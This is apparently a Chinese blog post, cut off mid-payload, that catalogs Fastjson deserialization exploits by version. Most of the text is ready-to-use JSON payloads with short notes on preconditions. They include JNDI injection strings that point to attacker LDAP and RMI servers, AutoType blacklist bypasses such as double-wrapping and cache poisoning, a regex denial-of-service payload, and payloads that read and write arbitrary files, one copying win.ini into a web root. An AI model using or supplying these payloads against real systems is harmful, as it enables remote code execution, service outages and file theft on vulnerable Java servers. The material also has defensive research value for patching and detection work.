href="https://github.com/LeadroyaL/fastjson-blacklist">https://github.com/LeadroyaL/fastjson-blacklist</a><br>exp<br>条件需要开启autotype<br>双写绕过</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;dataSourceName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://localhost:1389/badNameClass&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;autoCommit&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h3 id="Fastjson-1-2-25-1-2-43"><a href="#Fastjson-1-2-25-1-2-43" class="headerlink" title="Fastjson 1.2.25-1.2.43"></a>Fastjson 1.2.25-1.2.43</h3><p>exp<br>条件需要开启autotype<br>加[{绕过</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;dataSourceName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://localhost:1389/badNameClass&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;autoCommit&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h3 id="Fastjson-1-2-25-1-2-45"><a href="#Fastjson-1-2-25-1-2-45" class="headerlink" title="Fastjson 1.2.25-1.2.45"></a>Fastjson 1.2.25-1.2.45</h3><p>条件需要开启autotype<br>45把之前问题修了，但是可以借助第三方组件绕过。<br>需要mybatis，且版本需为3.x.x系列&lt;3.5.0的版本。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;properties&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;data_source&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://localhost:1389/badNameClass&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h3 id="Fastjson-1-2-25-1-2-47-通杀"><a href="#Fastjson-1-2-25-1-2-47-通杀" class="headerlink" title="Fastjson 1.2.25-1.2.47 通杀"></a>Fastjson 1.2.25-1.2.47 通杀</h3><p>借助缓存进行通杀，缓存在1.2.48被改为默认关闭<br>漏洞原理是通过java.lang.Class，将JdbcRowSetImpl类加载到Map中缓存，从而绕过AutoType的检测<br>这里有两大版本范围：</p><ul><li>1.2.25-1.2.32版本：未开启AutoTypeSupport时能成功利用，开启AutoTypeSupport不能利用</li><li>1.2.33-1.2.47版本：无论是否开启AutoTypeSupport，都能成功利用</li></ul><p>poc:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;a&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.Class&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;b&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;dataSourceName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://localhost:1389/badNameClass&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;autoCommit&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><strong>1.2.48之后版本，小弟水平有限还未复现研究，payload需要注意的细节还未探索</strong></p><h3 id="Fastjson-1-2-36-1-2-62"><a href="#Fastjson-1-2-36-1-2-62" class="headerlink" title="Fastjson 1.2.36-1.2.62"></a>Fastjson 1.2.36-1.2.62</h3><p>正则表达式拒绝服务漏洞</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;regex&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;$[\blue = /\^[a-zA-Z]+(([a-zA-Z ])?[a-zA-Z]*)*$/]&quot;</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;blue&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaa!&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;regex&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;$[blue rlike &#x27;^[a-zA-Z]+(([a-zA-Z ])?[a-zA-Z]*)*$&#x27;]&quot;</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;blue&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaa!&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h3 id="Fastjson-1-2-5"><a href="#Fastjson-1-2-5" class="headerlink" title="Fastjson 1.2.5 &lt;&#x3D; 1.2.59"></a>Fastjson 1.2.5 &lt;&#x3D; 1.2.59</h3><p><strong>需要开启AutoType</strong></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.zaxxer.hikari.HikariConfig&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;metricRegistry&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.zaxxer.hikari.HikariConfig&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;healthCheckRegistry&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h3 id="Fastjson-1-2-5-1"><a href="#Fastjson-1-2-5-1" class="headerlink" title="Fastjson 1.2.5 &lt;&#x3D; 1.2.60"></a>Fastjson 1.2.5 &lt;&#x3D; 1.2.60</h3><p><strong>需开启 autoType：</strong></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;oracle.jdbc.connector.OracleManagedConnectionFactory&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;xaDataSourceName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;rmi://10.10.20.166:1099/ExportObject&quot;</span><span class="hljs-punctuation">&#125;</span><br><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.commons.configuration.JNDIConfiguration&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;prefix&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://10.10.20.166:1389/ExportObject&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h3 id="Fastjson-1-2-5-2"><a href="#Fastjson-1-2-5-2" class="headerlink" title="Fastjson 1.2.5 &lt;&#x3D; 1.2.61"></a>Fastjson 1.2.5 &lt;&#x3D; 1.2.61</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.commons.proxy.provider.remoting.SessionBeanProvider&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;jndiName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;Object&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;a&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h3 id="Fastjson"><a href="#Fastjson" class="headerlink" title="Fastjson &lt;1.2.62"></a>Fastjson &lt;1.2.62</h3><ul><li>需要开启AutoType；</li><li>Fastjson &lt;&#x3D; 1.2.62；</li><li>JNDI注入利用所受的JDK版本限制；</li><li>目标服务端需要存在xbean-reflect包；<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;AsText&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;rmi://127.0.0.1:1098/exploit&quot;</span><span class="hljs-punctuation">&#125;</span><br><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.cocoon.components.slide.impl.JMSContentInterceptor&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;parameters&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.util.Hashtable&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;java.naming.factory.initial&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;topic-factory&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;namespace&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson&lt;&#x3D;1.2.66"></a>fastjson&lt;&#x3D;1.2.66</h3><p><strong>前提条件</strong></p><ul><li>开启AutoType；</li><li>Fastjson &lt;&#x3D; 1.2.66；</li><li>JNDI注入利用所受的JDK版本限制；</li><li>org.apache.shiro.jndi.JndiObjectFactory类需要shiro-core包；</li><li>br.com.anteros.dbcp.AnterosDBCPConfig类需要Anteros-Core和Anteros-DBCP包；</li><li>com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig类需要ibatis-sqlmap和jta包；</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;resourceName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://192.168.80.1:1389/Calc&quot;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.shiro.realm.jndi.JndiRealmFactory&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;jndiNames&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;Realms&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">&#125;</span><br><br><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;metricRegistry&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://192.168.80.1:1389/Calc&quot;</span><span class="hljs-punctuation">&#125;</span><br><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;healthCheckRegistry&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="hljs-punctuation">&#125;</span><br><br><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;jndiNames&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://192.168.80.1:1389/Calc&quot;</span><span class="hljs-punctuation">&#125;</span><br><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;properties&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.util.Properties&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;UserTransaction&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://192.168.80.1:1399/Calc&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>适用于jdk11以上版本的写文件的payload：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;sun.rmi.server.MarshalOutputStream&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;out&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.util.zip.InflaterOutputStream&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;out&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.io.FileOutputStream&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;file&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/tmp/asdasd&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;append&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;infl&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;input&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;array&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;eJxLLE5JTCkGAAh5AnE=&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;limit&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">14</span><br>      <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;bufLen&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;100&quot;</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;protocolVersion&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h3 id="fastjson-1"><a href="#fastjson-1" class="headerlink" title="fastjson&lt;&#x3D;1.2.67"></a>fastjson&lt;&#x3D;1.2.67</h3><p><strong>前提条件</strong></p><ul><li>开启AutoType；</li><li>Fastjson &lt;&#x3D; 1.2.67；</li><li>JNDI注入利用所受的JDK版本限制；</li><li>org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup类需要ignite-core、ignite-jta和jta依赖；</li><li>org.apache.shiro.jndi.JndiObjectFactory类需要shiro-core和slf4j-api依赖；<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;jndiNames&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;tm&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;$.tm&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;resourceName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;instance&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;$.instance&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="fastjson-2"><a href="#fastjson-2" class="headerlink" title="fastjson&lt;&#x3D;1.2.68"></a>fastjson&lt;&#x3D;1.2.68</h3><ul><li>Fastjson &lt;&#x3D; 1.2.68；</li><li>利用类必须是expectClass类的子类或实现类，并且不在黑名单中；<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;metricRegistry&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;healthCheckRegistry&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.caucho.config.types.ResourceRef&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;lookupName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;value&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;$ref&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;$.value&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure></li></ul><p>无需开启AutoType，直接成功绕过CheckAutoType()的检测从而触发执行：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;vul.VulAutoCloseable&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;cmd&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;calc&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>读文件</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;tempPath&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;C:/Windows/win.ini&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;targetPath&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;D:/wamp64/www/win.txt&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>写文件</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.io.FileOutputStream&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;file&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/tmp/nonexist&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;append&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;false&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.io.FileWriter&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;file&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/tmp/nonexist&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;append&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;false&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>写文件</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;stream&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span 